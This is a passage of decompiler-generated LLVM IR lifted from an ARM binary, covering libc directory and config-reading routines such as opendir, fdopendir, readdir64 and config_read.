  %v1_125e0 = inttoptr i32 %v12_125d8 to i32*
  store i32 %v2_125dc, i32* %v1_125e0, align 4
  %v3_125e0 = add i32 %v0_125d4, 44
  %v4_125e0 = inttoptr i32 %v3_125e0 to i32*
  %v5_125e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_125e0, i32* %v4_125e0, align 4
  %v0_125e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_125e4

dec_label_pc_125e4:                               ; preds = %bb, %dec_label_pc_1259c, %dec_label_pc_125ac
  %v0_125e4 = phi i32 [ 0, %bb ], [ %v0_125a4, %dec_label_pc_1259c ], [ %v0_125e4.pre, %dec_label_pc_125ac ]
  store i32 %v12_1252c, i32* @r7, align 4
  ret i32 %v0_125e4

; uselistorder directives
  uselistorder i32 %v2_12588, { 1, 0, 2 }
  uselistorder i32 %v1_12540, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_125e4, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_12604 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_12634, label %dec_label_pc_1261c

dec_label_pc_1261c:                               ; preds = %entry
  %v0_12620 = call i32 @__aeabi_read_tp()
  %v3_12624 = load i16, i16* @global_var_24070.401, align 2
  %v4_12624 = sext i16 %v3_12624 to i32
  %v0_12628 = load i32, i32* %r2.global-to-local, align 4
  %v1_12628 = sub i32 0, %v0_12628
  store i32 %v1_12628, i32* %r2.global-to-local, align 4
  %v3_1262c = add i32 %v4_12624, %v0_12620
  %v4_1262c = inttoptr i32 %v3_1262c to i32*
  store i32 %v1_12628, i32* %v4_1262c, align 4
  br label %dec_label_pc_12658

dec_label_pc_12634:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_12634 = icmp slt i32 %arg1, 0
  br i1 %v1_12634, label %dec_label_pc_12658, label %dec_label_pc_1263c

dec_label_pc_1263c:                               ; preds = %dec_label_pc_12634
  store i32 %v2_12604, i32* @r1, align 4
  %v0_12640 = call i32 @fstat()
  %v1_12644 = icmp slt i32 %v0_12640, 0
  br i1 %v1_12644, label %dec_label_pc_1264c, label %dec_label_pc_12660

dec_label_pc_1264c:                               ; preds = %dec_label_pc_1263c
  br label %dec_label_pc_12658

dec_label_pc_12658:                               ; preds = %dec_label_pc_1264c, %dec_label_pc_12634, %dec_label_pc_1261c
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_126a4

dec_label_pc_12660:                               ; preds = %dec_label_pc_1263c
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_12668 = load i32, i32* @r7, align 4
  %v3_1266c = call i32 @__GI___fcntl_nocancel(i32 %v0_12668, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_12674 = load i32, i32* @r7, align 4
  %v2_12678 = call i32 @fd_to_DIR(i32 %v0_12674, i32 %tmp)
  store i32 %v2_12678, i32* %r1.global-to-local, align 4
  %v2_1267c = icmp eq i32 %v2_12678, 0
  br i1 %v2_1267c, label %dec_label_pc_12684, label %dec_label_pc_126a4

dec_label_pc_12684:                               ; preds = %dec_label_pc_12660
  %v0_12694 = call i32 @__aeabi_read_tp()
  %v3_12698 = load i16, i16* @global_var_24070.401, align 2
  %v4_12698 = sext i16 %v3_12698 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_126a0 = add i32 %v4_12698, %v0_12694
  %v4_126a0 = inttoptr i32 %v3_126a0 to i32*
  store i32 12, i32* %v4_126a0, align 4
  %v0_126a4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_126a4

dec_label_pc_126a4:                               ; preds = %dec_label_pc_12660, %dec_label_pc_12658, %dec_label_pc_12684
  %v0_126a4 = phi i32 [ %v2_12678, %dec_label_pc_12660 ], [ 0, %dec_label_pc_12658 ], [ %v0_126a4.pre, %dec_label_pc_12684 ]
  ret i32 %v0_126a4

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_126a4, { 2, 0, 1 }
}

define i32 @"$d.1"(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_126b4:
  %v0_126b4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_126b4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_126b4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_126b4, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_126c4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_126c4, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_126d0 = call i32 @fstat()
  store i32 %v0_126d0, i32* @r5, align 4
  %v2_126d4 = icmp eq i32 %v0_126d0, 0
  br i1 %v2_126d4, label %dec_label_pc_126dc, label %dec_label_pc_12754

dec_label_pc_126dc:                               ; preds = %entry
  %v1_126e0 = and i32 %tmp4, 61440
  store i32 %v1_126e0, i32* @r3, align 4
  %v7_126e4 = icmp eq i32 %v1_126e0, 16384
  br i1 %v7_126e4, label %dec_label_pc_12704, label %dec_label_pc_126ec

dec_label_pc_126ec:                               ; preds = %dec_label_pc_126dc
  %v0_126f0 = call i32 @__aeabi_read_tp()
  %v3_126f4 = load i16, i16* @global_var_24070.401, align 2
  %v0_126f8 = load i32, i32* @r5, align 4
  store i32 %v0_126f8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12738

dec_label_pc_12704:                               ; preds = %dec_label_pc_126dc
  %v0_12704 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_1270c = call i32 @__libc_fcntl(i32 %v0_12704, i32 3)
  %v7_12710 = icmp eq i32 %v2_1270c, -1
  br i1 %v7_12710, label %dec_label_pc_12754, label %dec_label_pc_12718

dec_label_pc_12718:                               ; preds = %dec_label_pc_12704
  %v1_12718 = urem i32 %v2_1270c, 4
  store i32 %v1_12718, i32* %r3.global-to-local, align 4
  %v7_1271c = icmp eq i32 %v1_12718, 1
  br i1 %v7_1271c, label %dec_label_pc_12724, label %dec_label_pc_12740

dec_label_pc_12724:                               ; preds = %dec_label_pc_12718
  %v0_12728 = call i32 @__aeabi_read_tp()
  %v3_1272c = load i16, i16* @global_var_24070.401, align 2
  %v0_12730 = load i32, i32* @r5, align 4
  store i32 %v0_12730, i32* %r1.global-to-local, align 4
  %v0_12734 = load i32, i32* %r3.global-to-local, align 4
  %v1_12734 = add i32 %v0_12734, 21
  br label %dec_label_pc_12738

dec_label_pc_12738:                               ; preds = %dec_label_pc_126ec, %dec_label_pc_12724
  %v2_12738.in = phi i16 [ %v3_126f4, %dec_label_pc_126ec ], [ %v3_1272c, %dec_label_pc_12724 ]
  %v1_12738 = phi i32 [ %v0_126f0, %dec_label_pc_126ec ], [ %v0_12728, %dec_label_pc_12724 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_126ec ], [ %v1_12734, %dec_label_pc_12724 ]
  %v2_12738 = sext i16 %v2_12738.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_12738 = add i32 %v1_12738, %v2_12738
  %v4_12738 = inttoptr i32 %v3_12738 to i32*
  store i32 %storemerge, i32* %v4_12738, align 4
  %v0_12758.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12758

dec_label_pc_12740:                               ; preds = %dec_label_pc_12718
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_12744 = load i32, i32* @r4, align 4
  %v2_12748 = call i32 @fd_to_DIR(i32 %v0_12744, i32 %tmp)
  store i32 %v2_12748, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12758

dec_label_pc_12754:                               ; preds = %entry, %dec_label_pc_12704
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12758

dec_label_pc_12758:                               ; preds = %dec_label_pc_12740, %dec_label_pc_12738, %dec_label_pc_12754
  %v0_12758 = phi i32 [ %v2_12748, %dec_label_pc_12740 ], [ %v0_12758.pre, %dec_label_pc_12738 ], [ 0, %dec_label_pc_12754 ]
  ret i32 %v0_12758

; uselistorder directives
  uselistorder i32 %v1_12718, { 1, 0 }
  uselistorder i32 %v2_1270c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 2, 0, 1 }
  uselistorder i32 16384, { 1, 0, 3, 2 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_12758, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12754, { 1, 0 }
  uselistorder label %dec_label_pc_12738, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r6, align 4
  %v1_12784 = add i32 %tmp, 24
  store i32 %v1_12784, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_1279c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 120) to i32*), align 4
  store i32 %v4_1279c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1279c)
  %v0_127b0 = load i32, i32* @r6, align 4
  %v2_127b0 = add i32 %v0_127b0, 16
  %v3_127b0 = inttoptr i32 %v2_127b0 to i32*
  %v4_127b0 = load i32, i32* %v3_127b0, align 4
  store i32 %v4_127b0, i32* %ip.global-to-local, align 4
  store i32 75708, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_127b0)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_127c0

dec_label_pc_127c0:                               ; preds = %dec_label_pc_127f0, %entry
  %v0_127c0 = load i32, i32* @r5, align 4
  %v1_127c0 = add i32 %v0_127c0, 4
  %v2_127c0 = inttoptr i32 %v1_127c0 to i32*
  %v3_127c0 = load i32, i32* %v2_127c0, align 4
  %v4_127c0 = add i32 %v0_127c0, 8
  %v5_127c0 = inttoptr i32 %v4_127c0 to i32*
  %v6_127c0 = load i32, i32* %v5_127c0, align 4
  %tmp10 = icmp ugt i32 %v6_127c0, %v3_127c0
  br i1 %tmp10, label %dec_label_pc_127f0, label %dec_label_pc_127cc

dec_label_pc_127cc:                               ; preds = %dec_label_pc_127c0
  %v1_127cc = inttoptr i32 %v0_127c0 to i32*
  %v2_127cc = load i32, i32* %v1_127cc, align 4
  %v1_127d0 = add i32 %v0_127c0, 12
  %v2_127d0 = inttoptr i32 %v1_127d0 to i32*
  %v3_127d0 = load i32, i32* %v2_127d0, align 4
  %v1_127d4 = add i32 %v0_127c0, 20
  %v2_127d4 = inttoptr i32 %v1_127d4 to i32*
  %v3_127d4 = load i32, i32* %v2_127d4, align 4
  %v4_127d8 = inttoptr i32 %v3_127d0 to i32*
  %v5_127d8 = call i32 @__getdents64(i32 %v2_127cc, i32* %v4_127d8, i32 %v3_127d4, i32 %v6_127c0)
  %tmp9 = icmp slt i32 %v5_127d8, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_127e8

.thread:                                          ; preds = %dec_label_pc_127cc
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12820

dec_label_pc_127e8:                               ; preds = %dec_label_pc_127cc
  %v1_127e8 = load i32, i32* @r5, align 4
  %v2_127e8 = add i32 %v1_127e8, 8
  %v3_127e8 = inttoptr i32 %v2_127e8 to i32*
  store i32 %v5_127d8, i32* %v3_127e8, align 4
  %v0_127ec = load i32, i32* @r7, align 4
  %v1_127ec = load i32, i32* @r5, align 4
  %v2_127ec = add i32 %v1_127ec, 4
  %v3_127ec = inttoptr i32 %v2_127ec to i32*
  store i32 %v0_127ec, i32* %v3_127ec, align 4
  %v0_127f0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_127f0

dec_label_pc_127f0:                               ; preds = %dec_label_pc_127c0, %dec_label_pc_127e8
  %v1_12814 = phi i32 [ %v0_127c0, %dec_label_pc_127c0 ], [ %v0_127f0.pre, %dec_label_pc_127e8 ]
  %v1_127f0 = add i32 %v1_12814, 4
  %v2_127f0 = inttoptr i32 %v1_127f0 to i32*
  %v3_127f0 = load i32, i32* %v2_127f0, align 4
  %v1_127f4 = add i32 %v1_12814, 12
  %v2_127f4 = inttoptr i32 %v1_127f4 to i32*
  %v3_127f4 = load i32, i32* %v2_127f4, align 4
  %v2_127f8 = add i32 %v3_127f4, %v3_127f0
  store i32 %v2_127f8, i32* @r4, align 4
  %v3_127fc = inttoptr i32 %v2_127f8 to i32*
  %v4_127fc = load i32, i32* %v3_127fc, align 4
  %v1_12800 = add i32 %v2_127f8, 4
  %v2_12800 = inttoptr i32 %v1_12800 to i32*
  %v3_12800 = load i32, i32* %v2_12800, align 4
  %v1_12804 = add i32 %v2_127f8, 16
  %v2_12804 = inttoptr i32 %v1_12804 to i16*
  %v3_12804 = load i16, i16* %v2_12804, align 2
  %v4_12804 = zext i16 %v3_12804 to i32
  %v1_12808 = add i32 %v2_127f8, 8
  %v2_12808 = inttoptr i32 %v1_12808 to i32*
  %v3_12808 = load i32, i32* %v2_12808, align 4
  store i32 %v3_12808, i32* %ip.global-to-local, align 4
  %v2_1280c = add i32 %v4_12804, %v3_127f0
  %v2_12810 = or i32 %v3_12800, %v4_127fc
  %v4_12810 = icmp eq i32 %v2_12810, 0
  store i32 %v2_1280c, i32* %v2_127f0, align 4
  %v0_12818 = load i32, i32* %ip.global-to-local, align 4
  %v1_12818 = load i32, i32* @r5, align 4
  %v2_12818 = add i32 %v1_12818, 16
  %v3_12818 = inttoptr i32 %v2_12818 to i32*
  store i32 %v0_12818, i32* %v3_12818, align 4
  br i1 %v4_12810, label %dec_label_pc_127c0, label %dec_label_pc_12820

dec_label_pc_12820:                               ; preds = %dec_label_pc_127f0, %.thread
  %v0_1282c = load i32, i32* @r6, align 4
  %v2_1282c = add i32 %v0_1282c, 48
  %v3_1282c = inttoptr i32 %v2_1282c to i32*
  %v4_1282c = load i32, i32* %v3_1282c, align 4
  store i32 %v4_1282c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1282c)
  %v0_12838 = load i32, i32* @r4, align 4
  ret i32 %v0_12838

; uselistorder directives
  uselistorder i32 %v2_127f8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_12814, { 1, 0 }
  uselistorder i32 %v6_127c0, { 1, 0 }
  uselistorder i32 %v0_127c0, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_127f0, { 1, 0 }
}

define i32 @function_1284c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1284c:
  %v0_1284c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1284c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1284c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1284c, %bb
  %v10_12858 = phi i32 [ %arg1, %dec_label_pc_1284c ], [ 0, %bb ]
  ret i32 %v10_12858

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1285c = load i32, i32* @r4, align 4
  %v6_1285c = load i32, i32* @r5, align 4
  %v9_1285c = load i32, i32* @r6, align 4
  %v12_1285c = load i32, i32* @r7, align 4
  %v15_1285c = load i32, i32* @r8, align 4
  %v18_1285c = load i32, i32* @sb, align 4
  %v21_1285c = load i32, i32* @sl, align 4
  %v24_1285c = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_12860 = icmp eq i32* %arg1, null
  store i1 %v2_12860, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_12860, label %dec_label_pc_12b70, label %dec_label_pc_12878

dec_label_pc_12878:                               ; preds = %entry
  %v1_12878 = urem i32 %arg3, 256
  store i32 %v1_12878, i32* @sb, align 4
  %v1_1287c = udiv i32 %arg3, 256
  %v3_12880 = urem i32 %v1_1287c, 256
  %v3_12884 = mul nuw nsw i32 %v1_12878, 4
  %v1_1288c = or i32 %v3_12884, 1
  %v1_12898 = and i32 %arg3, 131072
  %v1_1289c = add nsw i32 %v1_12878, -1
  %v1_128a8 = and i32 %arg3, 262144
  store i32 %v1_128a8, i32* %r2.global-to-local, align 4
  %v1_128ac = and i32 %arg3, 65536
  store i32 %v1_128ac, i32* %r3.global-to-local, align 4
  store i32 %v1_128ac, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_128bc = add i32 %arg4, 1
  store i32 %v1_128bc, i32* @sl, align 4
  %v2_12a34 = icmp eq i32 %v1_12898, 0
  %v1_12a8c = inttoptr i32 %arg2 to i32*
  %v2_12aa4 = icmp eq i32 %v1_128a8, 0
  br label %dec_label_pc_128c0

dec_label_pc_128c0:                               ; preds = %dec_label_pc_128c0.backedge, %dec_label_pc_12878
  %v2_128dc = phi i32 [ %v0_128c0.pre, %dec_label_pc_128c0.backedge ], [ %tmp, %dec_label_pc_12878 ]
  %v1_128c0 = add i32 %v2_128dc, 4
  %v2_128c0 = inttoptr i32 %v1_128c0 to i32*
  %v3_128c0 = load i32, i32* %v2_128c0, align 4
  store i32 %v3_128c0, i32* %r3.global-to-local, align 4
  %v2_128c4 = icmp eq i32 %v3_128c0, 0
  store i1 %v2_128c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_128c4, label %dec_label_pc_128cc, label %dec_label_pc_12914

dec_label_pc_128cc:                               ; preds = %dec_label_pc_128c0
  %v1_128cc = add i32 %v2_128dc, 16
  %v2_128cc = inttoptr i32 %v1_128cc to i32*
  %v3_128cc = load i32, i32* %v2_128cc, align 4
  store i32 %v3_128cc, i32* %r3.global-to-local, align 4
  %v2_128d0 = icmp eq i32 %v3_128cc, 0
  store i1 %v2_128d0, i1* %cpsr_z.global-to-local, align 1
  %v1_128d4 = add i32 %v2_128dc, 8
  %v2_128d4 = inttoptr i32 %v1_128d4 to i32*
  %v3_128d4 = load i32, i32* %v2_128d4, align 4
  store i32 %v3_128d4, i32* %r3.global-to-local, align 4
  br i1 %v2_128d0, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_128cc
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_128cc, align 4
  %v0_128e0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_128cc, %bb
  %v0_128e0 = phi i32 [ %v0_128e0.pre, %bb ], [ %v3_128d4, %dec_label_pc_128cc ]
  %v2_128e0 = icmp eq i32 %v0_128e0, 0
  store i1 %v2_128e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_128e0, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_1288c, i32* %r3.global-to-local, align 4
  %v2_128e8 = load i32, i32* @r5, align 4
  %v3_128e8 = add i32 %v2_128e8, 8
  %v4_128e8 = inttoptr i32 %v3_128e8 to i32*
  store i32 %v1_1288c, i32* %v4_128e8, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_128ec = load i32, i32* @r5, align 4
  %v1_128ec = add i32 %v0_128ec, 16
  %v2_128ec = inttoptr i32 %v1_128ec to i32*
  %v3_128ec = load i32, i32* %v2_128ec, align 4
  store i32 %v3_128ec, i32* %r0.global-to-local, align 4
  %v1_128f0 = add i32 %v0_128ec, 8
  %v2_128f0 = inttoptr i32 %v1_128f0 to i32*
  %v3_128f0 = load i32, i32* %v2_128f0, align 4
  store i32 %v3_128f0, i32* %r3.global-to-local, align 4
  %v2_128f4 = add i32 %v3_128f0, %v3_128ec
  store i32 %v2_128f4, i32* %r0.global-to-local, align 4
  %v1_128f8 = call i32 @malloc(i32 %v2_128f4)
  store i32 %v1_128f8, i32* %r0.global-to-local, align 4
  %v2_128fc = icmp eq i32 %v1_128f8, 0
  store i1 %v2_128fc, i1* %cpsr_z.global-to-local, align 1
  %v1_12900 = load i32, i32* @r5, align 4
  %v2_12900 = add i32 %v1_12900, 4
  %v3_12900 = inttoptr i32 %v2_12900 to i32*
  store i32 %v1_128f8, i32* %v3_12900, align 4
  br i1 %v2_128fc, label %dec_label_pc_12b70, label %dec_label_pc_12908

dec_label_pc_12908:                               ; preds = %.thread
  %v0_12908 = load i32, i32* @r5, align 4
  %v1_12908 = add i32 %v0_12908, 20
  %v2_12908 = inttoptr i32 %v1_12908 to i32*
  %v3_12908 = load i32, i32* %v2_12908, align 4
  %v1_1290c = or i32 %v3_12908, 1
  store i32 %v1_1290c, i32* %r3.global-to-local, align 4
  store i32 %v1_1290c, i32* %v2_12908, align 4
  %v0_12914.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12914

dec_label_pc_12914:                               ; preds = %dec_label_pc_128c0, %dec_label_pc_12908
  %v1_1291c = phi i32 [ %v2_128dc, %dec_label_pc_128c0 ], [ %v0_12914.pre, %dec_label_pc_12908 ]
  %v1_12914 = add i32 %v1_1291c, 4
  %v2_12914 = inttoptr i32 %v1_12914 to i32*
  %v3_12914 = load i32, i32* %v2_12914, align 4
  store i32 %v3_12914, i32* %r2.global-to-local, align 4
  %v4_12914 = add i32 %v1_1291c, 8
  %v5_12914 = inttoptr i32 %v4_12914 to i32*
  %v6_12914 = load i32, i32* %v5_12914, align 4
  %v2_12918 = add i32 %v6_12914, %v3_12914
  store i32 %v2_12918, i32* %r3.global-to-local, align 4
  %v2_1291c = add i32 %v1_1291c, 12
  %v3_1291c = inttoptr i32 %v2_1291c to i32*
  store i32 %v2_12918, i32* %v3_1291c, align 4
  %v0_12920 = load i32, i32* @fp, align 4
  store i32 %v0_12920, i32* @r6, align 4
  br label %dec_label_pc_12924

dec_label_pc_12924:                               ; preds = %dec_label_pc_129b0, %dec_label_pc_1299c, %dec_label_pc_12914
  %v0_1292c = phi i32 [ %v0_12920, %dec_label_pc_12914 ], [ %v1_1299c, %dec_label_pc_1299c ], [ %v0_1292c.pre.pre, %dec_label_pc_129b0 ]
  %v0_12924 = load i32, i32* @r5, align 4
  %v1_12924 = add i32 %v0_12924, 12
  store i32 %v1_12924, i32* %r0.global-to-local, align 4
  %v1_12928 = inttoptr i32 %v1_12924 to i32*
  %v2_12928 = load i32, i32* %v1_12928, align 4
  store i32 %v2_12928, i32* %r0.global-to-local, align 4
  %v3_12928 = add i32 %v0_12924, 16
  %v4_12928 = inttoptr i32 %v3_12928 to i32*
  %v5_12928 = load i32, i32* %v4_12928, align 4
  %v2_1292c = add i32 %v2_12928, %v0_1292c
  store i32 %v2_1292c, i32* %r0.global-to-local, align 4
  %v2_12930 = sub i32 %v5_12928, %v0_1292c
  %v1_12934 = inttoptr i32 %v0_12924 to i32*
  %v2_12934 = load i32, i32* %v1_12934, align 4
  store i32 %v2_12934, i32* %r2.global-to-local, align 4
  %v3_12938 = call i32 @fgets(i32 %v2_1292c, i32 %v2_12930, i32 %v2_12934)
  store i32 %v3_12938, i32* %r0.global-to-local, align 4
  store i32 %v3_12938, i32* %r4.global-to-local, align 4
  %v2_1293c = icmp eq i32 %v3_12938, 0
  store i1 %v2_1293c, i1* %cpsr_z.global-to-local, align 1
  %v0_12944 = load i32, i32* @r5, align 4
  %v1_12944 = add i32 %v0_12944, 12
  br i1 %v2_1293c, label %dec_label_pc_12944, label %dec_label_pc_1295c

dec_label_pc_12944:                               ; preds = %dec_label_pc_12924
  store i32 %v1_12944, i32* %r0.global-to-local, align 4
  %v1_12948 = inttoptr i32 %v1_12944 to i32*
  %v2_12948 = load i32, i32* %v1_12948, align 4
  store i32 %v2_12948, i32* %r0.global-to-local, align 4
  %v3_12948 = add i32 %v0_12944, 16
  %v4_12948 = inttoptr i32 %v3_12948 to i32*
  %v5_12948 = load i32, i32* %v4_12948, align 4
  store i32 %v5_12948, i32* %r2.global-to-local, align 4
  %v3_12950 = inttoptr i32 %v2_12948 to i8*
  %v4_12950 = call i32 @__GI_memset(i8* %v3_12950, i32 0, i32 %v5_12948)
  store i32 %v4_12950, i32* %r0.global-to-local, align 4
  %v0_12954 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b74

dec_label_pc_1295c:                               ; preds = %dec_label_pc_12924
  %v2_1295c = inttoptr i32 %v1_12944 to i32*
  %v3_1295c = load i32, i32* %v2_1295c, align 4
  store i32 %v3_1295c, i32* @r4, align 4
  %v1_12960 = load i32, i32* @r6, align 4
  %v2_12960 = add i32 %v1_12960, %v3_1295c
  %v3_12960 = inttoptr i32 %v2_12960 to i8*
  store i32 %v2_12960, i32* %r0.global-to-local, align 4
  %v3_12964 = call i32 @strlen(i8* %v3_12960)
  %v0_1296c = load i32, i32* @r6, align 4
  %v2_1296c = add i32 %v0_1296c, %v3_12964
  store i32 %v2_1296c, i32* @r6, align 4
  %v0_12970 = load i32, i32* @r4, align 4
  store i32 %v0_12970, i32* @r0, align 4
  %v2_12974 = call i32 @__GI_strchr(i32 %v0_12970, i32 10)
  store i32 %v2_12974, i32* %r0.global-to-local, align 4
  %v2_12978 = icmp eq i32 %v2_12974, 0
  store i1 %v2_12978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12978, label %dec_label_pc_129a4, label %dec_label_pc_12980

dec_label_pc_12980:                               ; preds = %dec_label_pc_1295c
  %v1_12980 = inttoptr i32 %v2_12974 to i8*
  %v2_12980 = load i8, i8* %v1_12980, align 1
  %v3_12980 = zext i8 %v2_12980 to i32
  %v1_12984 = add nuw nsw i32 %v3_12980, 255
  %v1_12988 = urem i32 %v1_12984, 256
  store i32 %v1_12988, i32* %r3.global-to-local, align 4
  %v7_1298c = icmp eq i32 %v1_12988, 92
  store i1 %v7_1298c, i1* %cpsr_z.global-to-local, align 1
  %v1_12990 = trunc i32 %v1_12984 to i8
  store i8 %v1_12990, i8* %v1_12980, align 1
  %v0_12994 = load i32, i32* @r6, align 4
  %v1_12994 = add i32 %v0_12994, -1
  store i32 %v1_12994, i32* @r6, align 4
  %v0_12998 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12998, label %dec_label_pc_1299c, label %dec_label_pc_12a28

dec_label_pc_1299c:                               ; preds = %dec_label_pc_12980
  %v1_1299c = add i32 %v0_12994, -2
  store i32 %v1_1299c, i32* @r6, align 4
  br label %dec_label_pc_12924

dec_label_pc_129a4:                               ; preds = %dec_label_pc_1295c
  %v0_129a4 = load i32, i32* @r5, align 4
  %v1_129a4 = add i32 %v0_129a4, 20
  %v2_129a4 = inttoptr i32 %v1_129a4 to i32*
  %v3_129a4 = load i32, i32* %v2_129a4, align 4
  store i32 %v3_129a4, i32* %r3.global-to-local, align 4
  %v2_129a8 = icmp eq i32 %v3_129a4, 0
  store i1 %v2_129a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_129a8, label %dec_label_pc_129e0, label %dec_label_pc_129b0

dec_label_pc_129b0:                               ; preds = %dec_label_pc_129a4
  %v1_129b0 = add i32 %v0_129a4, 16
  %v2_129b0 = inttoptr i32 %v1_129b0 to i32*
  %v3_129b0 = load i32, i32* %v2_129b0, align 4
  store i32 %v3_129b0, i32* %r3.global-to-local, align 4
  %v1_129b4 = add i32 %v0_129a4, 8
  %v2_129b4 = inttoptr i32 %v1_129b4 to i32*
  %v3_129b4 = load i32, i32* %v2_129b4, align 4
  %v1_129b8 = add i32 %v3_129b0, 4096
  store i32 %v1_129b8, i32* %r3.global-to-local, align 4
  %v2_129bc = add i32 %v3_129b4, %v1_129b8
  store i32 %v2_129bc, i32* @r1, align 4
  store i32 %v1_129b8, i32* %v2_129b0, align 4
  %v0_129c4 = load i32, i32* @r5, align 4
  %v1_129c4 = add i32 %v0_129c4, 4
  %v2_129c4 = inttoptr i32 %v1_129c4 to i32*
